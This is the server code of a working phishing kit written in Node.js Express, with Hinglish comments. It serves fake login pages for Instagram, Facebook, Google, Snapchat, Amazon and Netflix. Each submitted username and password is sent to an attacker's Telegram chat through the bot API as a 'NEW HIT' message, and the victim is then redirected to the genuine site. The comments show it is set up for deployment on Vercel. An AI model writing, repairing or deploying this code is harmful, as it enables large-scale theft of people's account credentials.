const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const redirectMap = {
    'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com', 'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com', 'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', service.toLowerCase() + '.html'));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

app.post('/login-data', (req, res) => {
    const { username, password, service } = req.body;
    if (!username || !password || !service) return res.status(400).send("Missing data.");
    
    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).send("SERVER CONFIGURATION ERROR: BOT_TOKEN or CHAT_ID is missing on Vercel.");
    }

    const message = `💎✨ **!! NEW HIT !!** ✨💎\n▬▬▬▬▬▬▬▬▬▬▬▬\n🎯 **Service:** *${service}*\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n▬▬▬▬▬▬▬▬▬▬▬▬`;
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    axios.post(telegramApiUrl, {
        chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'
    })
    .then(() => {
        // Agar data send ho gaya, to hi redirect hoga
        res.redirect(redirectMap[service]);
    })
    .catch(error => {
        // AGAR DATA SEND FAIL HUA, TO YEH CHALEGA
        console.error("Telegram API Error:", error.response.data);

        // NAYA UPGRADE: Asli error browser mein dikhao
        const errorMessage = `
            <h1>DATA SEND FAILED.</h1>
            <p>Telegram API ne yeh error bheja hai:</p>
            <pre style="background-color:#f0f0f0; padding:15px; border-radius:5px;">${JSON.stringify(error.response.data, null, 2)}</pre>
            <hr>
            <p><strong>Iska matlab tumhara Vercel ka Environment Variable galat hai. Jaakar theek karo.</strong></p>
        `;
        res.status(500).send(errorMessage);
    });
});

module.exports = app;
